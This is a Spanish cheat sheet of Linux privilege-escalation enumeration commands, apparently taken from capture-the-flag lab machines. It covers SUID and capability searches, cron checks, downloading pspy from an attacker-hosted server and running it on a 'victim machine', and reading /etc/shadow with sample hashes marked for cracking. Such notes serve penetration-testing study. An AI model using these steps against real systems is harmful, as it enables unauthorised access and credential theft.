
### LISTAR SIEMPRE TODOS LOS ARCHIVOS DE CADA DIRECTORIO
```shell
developer@ambassador:~$ ls -al
```

### LISTAR GRUPOS
```shell
www-data@webserver:/$ id
```

### LISTAR PRIVILEGIOS UID PARA VER SI TENEMOS ALGUN BINARIO CON SUDO
```shell
www-data@webserver:/$ find / -perm -4000 2>/dev/null
```

### LISTAR PRIVILEGIOS UID PARA VER SI TENEMOS ALGUN BINARIO INTERESANTE...
```shell
www-data@webserver:/$ find / -perm -4000 2>/dev/null
```

### BUSCAR EN LA RAIZ POR UN GRUPO EN ESPECIFICO.
```shell
kyle@writer:/$ cd /
kyle@writer:/$ find . -group filter 2>/dev/null
```



### LISTAR ARCHIVOS GIT
```shell
roy@zetta:/$ find \-name .git 2>/dev/null
```



### VERSIÓN DEL SISTEMA
```shell
uname -a

lsb_release -a
```



### TAREAS CRONTAB
```shell
amrois@nineveh:/$ cat /etc/crontab
```


### TAREAS CON SYSTEMCTL
```shell
amrois@nineveh:/$ systemctl list-timers
```


# PSPY
```shell
#EN NUESTRA MÁQUINA LOCAL
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
python3 -m http.server 80

#EN MÁQUINA VICTIMA
wget http://192.168.45.233/pspy64
chmod +x ./pspy64
./pspy64
```


### BASH SCRIPT CRONTAB /tmp
```bash
old=$(ps -eo command)
while true; do
    new=$(ps -eo command)
    diff <(echo "$old") <(echo "$new") | grep [\<\>]
    sleep 1
    old=$new
done
```



### PROCESOS DEL SISTEMA
```shell
www-data@moderators:/var/www/html/logs/uploads$ ps -faux
	dash@usage:~/.config$ ss -tlpn
```


### PUERTOS INTERNOS ABIERTOS
```shell
www-data@moderators:/var/www/html/logs/uploads$ netstat -nat

www-data@moderators:/var/www/html/logs/uploads$ ss -nltp
```

### GETCAP
```shell
www-data@apocalyst:/$ which getcap
```


### LISTAT CAPACIDADES CON GETCAP
```shell
www-data@apocalyst:/$ getcap -r / 2>/dev/null
```


### VER SI PODEMOS EDITAR EL /etc/passwd
```shell
find / -writable -ls 2>/dev/null | grep -vE "/var|/run|/dev|/tmp|/lib|/proc|/sys"
```


### /ETC/SHADOW
```shell
#Podemos crackear los hashes...
root@webserver:/tmp# cat /etc/shadow
root:$y$j9T$s/Aqv48x449udndpLC6eC.$WUkrXgkW46N4xdpnhMoax7US.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::
drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
```
